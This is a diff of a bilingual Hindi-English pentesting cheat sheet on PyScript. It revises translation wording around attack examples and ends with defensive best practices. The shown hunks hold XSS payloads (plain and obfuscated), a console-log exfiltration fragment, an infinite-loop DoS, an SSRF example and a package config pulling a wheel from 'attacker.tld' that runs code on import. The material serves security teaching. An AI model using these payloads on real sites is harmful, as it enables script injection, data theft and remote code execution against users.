@@ -1,8 +1,10 @@
 # Pyscript
 
-## PyScript Pentesting Guide
+{{#include ../../banners/hacktricks-training.md}}
 
-PyScript HTML में Python को integrate करने के लिए विकसित किया गया एक नया framework है, ताकि इसका उपयोग HTML के साथ किया जा सके। इस cheat sheet में, आप जानेंगे कि अपने penetration testing उद्देश्यों के लिए PyScript का उपयोग कैसे करें।
+## PyScript Pentesting गाइड
+
+PyScript HTML में Python को integrate करने के लिए विकसित किया गया एक नया framework है, इसलिए इसका उपयोग HTML के साथ किया जा सकता है। इस cheat sheet में आपको अपने penetration testing उद्देश्यों के लिए PyScript का उपयोग करने का तरीका मिलेगा।
 
 ### Emscripten virtual memory filesystem से files Dumping / Retrieving:
 
@@ -17,9 +19,9 @@ with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
 ```
 परिणाम:
 
-![PyScript Pentesting Guide - Emscripten virtual memory filesystem से files Dumping / Retrieving: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
+![PyScript Pentesting Guide - Emscripten virtual memory filesystem से files dump / retrieve करना: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
 
-### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
+### [Emscripten virtual memory filesystem का OOB Data Exfiltration (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPkP5/blogs/the-art-of-vulnerability-chaining-pyscript)
 
 `CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
 \
@@ -45,11 +47,11 @@ body: JSON.stringify({ content: btoa(console.logs) }),
 ')
 </py-script>
 ```
-परिणाम:
+Result:
 
 ![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
 
-### Cross Site Scripting (Ordinary)
+### Cross Site Scripting (सामान्य)
 
 Code:
 ```python
@@ -59,7 +61,7 @@ print("<img src=x onerror='alert(document.domain)'>")
 ```
 परिणाम:
 
-![Emscripten virtual memory filesystem का OOB Data Exfiltration (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
+![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
 
 ### Cross Site Scripting (Python Obfuscated)
 
@@ -75,13 +77,13 @@ y = "o";m = "ner";z = "ror\u003d"
 print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 </py-script>
 ```
-परिणाम:
+Result:
 
 ![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)
 
 ### Cross Site Scripting (JavaScript Obfuscation)
 
-कोड:
+Code:
 ```html
 <py-script>
 prinht(""
@@ -149,30 +151,30 @@ return _0x599c()
 "")
 </py-script>
 ```
-Result:
+परिणाम:
 
 ![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (अनंत लूप)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
 
 ### DoS attack (अनंत लूप)
 
-Code:
+कोड:
 ```html
 <py-script>
 while True:
 print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
 </py-script>
 ```
-Result:
+परिणाम:
 
 ![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
 
 ---
 
-## नई vulnerabilities & techniques (2023-2025)
+## नई vulnerabilities और techniques (2023-2025)
 
-### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)
+### अनियंत्रित redirects के माध्यम से Server-Side Request Forgery (CVE-2025-50182)
 
-`urllib3 >= 2.2.0, < 2.5.0` Pyodide के browser transport के साथ उपयोग किए जाने पर `redirect` और `retries` request parameters को अनदेखा करता है। यदि कोई attacker target URLs को प्रभावित कर सकता है, तो code cross-domain redirects को follow कर सकता है, भले ही उसे उन्हें disable करने के लिए urllib3 से कहा गया हो, जिससे SSRF defenses कमजोर हो जाते हैं।<sup>[[1]](#references)[[4]](#references)</sup>
+`urllib3 >= 2.2.0, < 2.5.0` Pyodide के browser transport के साथ उपयोग किए जाने पर `redirect` और `retries` request parameters को अनदेखा करता है। यदि कोई attacker target URLs को प्रभावित कर सकता है, तो code cross-domain redirects का अनुसरण कर सकता है, भले ही वह urllib3 को उन्हें disable करने के लिए कहता हो, जिससे SSRF defenses कमजोर हो जाती हैं।<sup>[[1]](#references)[[4]](#references)</sup>
 ```html
 <script type="py">
 import urllib3
@@ -199,11 +201,11 @@ packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
 import payload  # executes attacker-controlled code at import
 </script>
 ```
-Pyodide पैकेज के WebAssembly build के बिना arbitrary URLs से pure-Python wheels install कर सकता है।<sup>[[6]](#references)</sup> इस configuration को developer-controlled रखें, exact package names या URLs को allow-list करें, और build या deployment के दौरान remote wheel digests verify करें।
+Pyodide किसी package के WebAssembly build के बिना arbitrary URLs से pure-Python wheels install कर सकता है।<sup>[[6]](#references)</sup> इस configuration को developer-controlled रखें, exact package names या URLs को allow-list करें, और build या deployment के दौरान remote wheel digests verify करें।
 
 ### Output sanitisation changes (2023+)
 
-* 2022.05.1 implementation में, जिसका उपयोग legacy examples में किया गया है, `print()` बिना HTML escaping के `text/plain` output लिखता है और इसलिए XSS-prone है।<sup>[[8]](#references)</sup>
+* Legacy examples में उपयोग किए गए 2022.05.1 implementation में, `print()` बिना HTML escaping के `text/plain` output लिखता है और इसलिए XSS-prone है।<sup>[[8]](#references)</sup>
 * वर्तमान `display()` helper plain strings के लिए default रूप से HTML को **escapes** करता है; raw markup को `pyscript.HTML()` में wrap करना आवश्यक है।<sup>[[2]](#references)</sup>
 ```python
 from pyscript import display, HTML
@@ -212,17 +214,17 @@ display("<b>escaped</b>")          # renders literally
 
 display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
 ```
-Untrusted input के लिए `display()` का उपयोग करें और untrusted strings को `HTML()` में पास न करें।<sup>[[2]](#references)</sup>
+अविश्वसनीय input के लिए `display()` का उपयोग करें और अविश्वसनीय strings को `HTML()` में pass न करें।<sup>[[2]](#references)</sup>
 
 ---
 
 ## Defensive Best Practices
 
 * **Packages को up to date रखें** – Node.js में `urllib3 >= 2.5.0` का उपयोग करें और browser redirect assumptions की अलग से समीक्षा करें।<sup>[[4]](#references)</sup>
-* **Package sources को प्रतिबंधित करें** – PyPI names या exact trusted URLs को allow-list करें, और build या deployment के दौरान remote wheel digests verify करें।<sup>[[5]](#references)[[6]](#references)</sup>
-* **Content Security Policy को harden करें** – inline JavaScript (`script-src 'self' 'sha256-…'`) को disallow करें, ताकि injected `<script>` blocks execute न हो सकें।
+* **Package sources को restrict करें** – PyPI names या exact trusted URLs को allow-list करें और build या deployment के दौरान remote wheel digests verify करें।<sup>[[5]](#references)[[6]](#references)</sup>
+* **Content Security Policy को harden करें** – inline JavaScript (`script-src 'self' 'sha256-…'`) को disallow करें, ताकि injected `<script>` blocks execute न कर सकें।
 * **User-supplied `<py-script>` / `<script type="py">` tags को disallow करें** – अन्य users को वापस echo करने से पहले server पर HTML को sanitise करें।
-* **Workers को isolate करें** – यदि आपको workers से DOM तक synchronous access की आवश्यकता नहीं है, तो `sync_main_only` flag enable करें ताकि `SharedArrayBuffer` और उससे जुड़ी CORS header requirements से बचा जा सके।<sup>[[5]](#references)</sup>
+* **Workers को isolate करें** – यदि आपको workers से DOM तक synchronous access की आवश्यकता नहीं है, तो `sync_main_only` flag enable करें, ताकि `SharedArrayBuffer` और उससे जुड़ी CORS header requirements से बचा जा सके।<sup>[[5]](#references)</sup>
 
 ## References
 
@@ -231,7 +233,7 @@ Untrusted input के लिए `display()` का उपयोग करें
 - [3] [Cyber Guy - Vulnerability Chaining की कला (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
 - [4] [urllib3 security advisory – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
 - [5] [PyScript configuration documentation – packages और `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
-- [6] [Pyodide – packages लोड करना](https://pyodide.org/en/stable/usage/loading-packages.html)
+- [6] [Pyodide – packages load करना](https://pyodide.org/en/stable/usage/loading-packages.html)
 - [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
 - [8] [PyScript 2022.05.1 `pyscript.py` implementation](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
 {{#include ../../banners/hacktricks-training.md}}
